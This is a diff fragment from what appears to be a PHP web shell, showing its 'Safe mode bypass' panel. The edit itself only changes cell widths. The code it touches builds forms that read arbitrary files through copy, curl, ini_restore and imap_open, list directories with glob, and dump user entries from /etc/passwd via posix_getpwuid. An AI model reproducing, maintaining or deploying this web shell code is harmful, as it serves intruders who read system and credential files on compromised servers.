@@ -1185,11 +1185,11 @@ function actionSafeMode() {
     _Header(); 
     echo '<h1>Safe mode bypass</h1><div class=content>'; 
     echo '
-	<table><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><tr><td style="width:110px;">Copy (read file):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
-	<table><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><tr><td style="width:110px;">Glob (list dir):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
-	<table><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><tr><td style="width:110px;">Curl (read file):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
-	<table><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><tr><td style="width:110px;">Ini_restore (read file):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
-	<table><form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><tr><td style="width:150px;">Imap_open (read file):</td><td><input type=text name=param><input type=submit value="submit"></form></table>
+	<table><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><tr><td style="width:140px;">Copy (read file):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
+	<table><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><tr><td style="width:140px;">Glob (list dir):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
+	<table><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><tr><td style="width:140px;">Curl (read file):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
+	<table><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><tr><td style="width:140px;">Ini_restore (read file):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
+	<table><form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><tr><td style="width:140px;">Imap_open (read file):</td><td><input type=text name=param><input type=submit value="submit"></form></table>
 	<br>
 	Posix_getpwuid ("Read" /etc/passwd)
 	<table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000>
